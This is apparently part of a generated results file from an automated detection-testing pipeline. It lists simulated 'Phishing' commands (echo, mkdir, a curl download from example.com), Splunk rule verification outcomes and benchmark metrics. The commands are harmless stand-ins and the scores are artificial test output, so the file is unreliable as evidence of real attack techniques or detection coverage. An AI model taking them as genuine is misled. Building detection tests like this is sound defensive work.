+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "A text file named phishing.txt will be created in the current directory, containing the phrase 'Please enter your password: '. This file can be used to test detection rules for phishing attempts.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:42.402973",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.621,
+      "validated": true
+    },
+    {
+      "id": "360c5d44-77d8-4411-adc5-b91c97f904eb",
+      "ttp_id": "4cca071c-8a0b-40fd-89c4-d75eff8229aa",
+      "technique_id": "4cca071c-8a0b-40fd-89c4-d75eff8229aa",
+      "technique_name": "Phishing",
+      "tactic": "Initial Access",
+      "platform": "linux",
+      "command": "mkdir phishing_directory && echo 'You have been phished!' > phishing_directory/phished.txt",
+      "description": "Create a directory and a file within it that contains a message indicating the user has been phished, simulating a more complex phishing scenario.",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "A directory named phishing_directory will be created in the current directory, containing a file named phished.txt with the message 'You have been phished!'. This can be used to test detection rules for more sophisticated phishing attempts.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:42.402973",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.621,
+      "validated": true
+    },
+    {
+      "id": "cd07c518-74f9-49ad-9c74-245f3911b4a0",
+      "ttp_id": "4cca071c-8a0b-40fd-89c4-d75eff8229aa",
+      "technique_id": "4cca071c-8a0b-40fd-89c4-d75eff8229aa",
+      "technique_name": "Phishing",
+      "tactic": "Initial Access",
+      "platform": "linux",
+      "command": "curl -s https://example.com/phishing_page.html > phishing_page.html",
+      "description": "Download an HTML page from a remote server and save it locally, simulating the retrieval of a phishing webpage. Note: This command assumes internet access and replaces the URL with a benign example.",
+      "requires_admin": false,
+      "safety_level": "medium",
+      "expected_behavior": "An HTML file named phishing_page.html will be downloaded from the specified URL and saved in the current directory. This can be used to test detection rules for phishing webpages, but be cautious of the source URL to avoid actual malicious content.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:42.402973",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.621,
+      "validated": true
+    }
+  ],
+  "siem_verification": [
+    {
+      "rule_id": "1a63a67f-4bbc-4439-bc5a-97fb0472f01d",
+      "ttp_id": "T1542",
+      "detected": false,
+      "events_found": 0,
+      "query_time_ms": 348.00000000000006,
+      "status": "success",
+      "message": "Verification complete"
+    },
+    {
+      "rule_id": "870ff47a-167a-4669-8fc9-707ac2b38b33",
+      "ttp_id": "T1204",
+      "detected": true,
+      "events_found": 30,
+      "query_time_ms": 389.0,
+      "status": "success",
+      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
+    },
+    {
+      "rule_id": "fdbec019-014a-4e89-adee-a2fee4a1c25d",
+      "ttp_id": "T1055",
+      "detected": true,
+      "events_found": 5,
+      "query_time_ms": 390.0,
+      "status": "success",
+      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
+    },
+    {
+      "rule_id": "bd4a07d9-cad1-4165-8b4d-169923323ab9",
+      "ttp_id": "T1562",
+      "detected": false,
+      "events_found": 0,
+      "query_time_ms": 697.0000000000001,
+      "status": "success",
+      "message": "Verification complete"
+    },
+    {
+      "rule_id": "06c99ca7-33c8-4865-b52c-fb6042862e0e",
+      "ttp_id": "T1059",
+      "detected": true,
+      "events_found": 103,
+      "query_time_ms": 563.0,
+      "status": "success",
+      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
+    },
+    {
+      "rule_id": "a76b5e8f-eacc-4346-926c-179e9fda8f60",
+      "ttp_id": "T1547",
+      "detected": true,
+      "events_found": 85,
+      "query_time_ms": 564.0,
+      "status": "success",
+      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
+    },
+    {
+      "rule_id": "e9ca3007-ad4b-400b-b8f0-9170c40b374f",
+      "ttp_id": "T1041",
+      "detected": false,
+      "events_found": 0,
+      "query_time_ms": 678.0,
+      "status": "success",
+      "message": "Verification complete"
+    },
+    {
+      "rule_id": "cd5ed070-f017-45e4-ad01-1703c71fdd3a",
+      "ttp_id": "T1021",
+      "detected": true,
+      "events_found": 1,
+      "query_time_ms": 583.0,
+      "status": "success",
+      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
+    },
+    {
+      "rule_id": "4cd24f5b-433b-4a3a-b8ba-296ac68403c9",
+      "ttp_id": "T1071",
+      "detected": true,
+      "events_found": 27,
+      "query_time_ms": 441.0,
+      "status": "success",
+      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
+    },
+    {
+      "rule_id": "65139d6a-515a-4e15-99ae-76fd7691712f",
+      "ttp_id": "T1056",
+      "detected": false,
+      "events_found": 0,
+      "query_time_ms": 494.0,
+      "status": "success",
+      "message": "Verification complete"
+    },
+    {
+      "rule_id": "c0380cec-65ee-40f5-808a-05d59b968ebd",
+      "ttp_id": "T1573",
+      "detected": true,
+      "events_found": 88,
+      "query_time_ms": 377.0,
+      "status": "success",
+      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
+    },
+    {
+      "rule_id": "163d2f91-0ec9-4de0-8636-f2714ded951c",
+      "ttp_id": "T1190",
+      "detected": true,
+      "events_found": 29,
+      "query_time_ms": 351.00000000000006,
+      "status": "success",
+      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
+    },
+    {
+      "rule_id": "262c7e5d-0dae-4457-afb3-9fc689391f3d",
+      "ttp_id": "T1082",
+      "detected": true,
+      "events_found": 24,
+      "query_time_ms": 545.0,
+      "status": "success",
+      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
+    },
+    {
+      "rule_id": "0e70a8ce-146a-426f-ac96-f8ab3663dd49",
+      "ttp_id": "T1543",
+      "detected": true,
+      "events_found": 6,
+      "query_time_ms": 850.0,
+      "status": "success",
+      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
+    },
+    {
+      "rule_id": "c9d5ceb6-422c-4a4d-9121-1e71e95367a5",
+      "ttp_id": "T1113",
+      "detected": true,
+      "events_found": 27,
+      "query_time_ms": 417.0,
+      "status": "success",
+      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
+    },
+    {
+      "rule_id": "cb26716d-eb73-40ca-b051-ccca1347baf1",
+      "ttp_id": "T1566",
+      "detected": true,
+      "events_found": 27,
+      "query_time_ms": 453.0,
+      "status": "success",
+      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
+    }
+  ],
+  "siem_metrics": {
+    "true_positives": 12,
+    "false_positives": 0,
+    "false_negatives": 4,
+    "precision": 1.0,
+    "detection_rate": 0.75,
+    "f1_score": 0.8571428571428571
+  },
+  "iterations": 1,
+  "final_score": 0.6156250000000001,
+  "final_report": {
+    "total_ttps": 23,
+    "optimized_ttps": 16,
+    "generated_rules": 16,
+    "generated_attacks": 94,
+    "timestamp": "2025-12-30T06:58:43.677025"
+  },
+  "timestamp": "2025-12-30T06:58:43.683431",
+  "benchmark_metrics": {
+    "duration_s": 734.104061126709,
+    "quality_score": 0.7092878467876512
+  }
+}
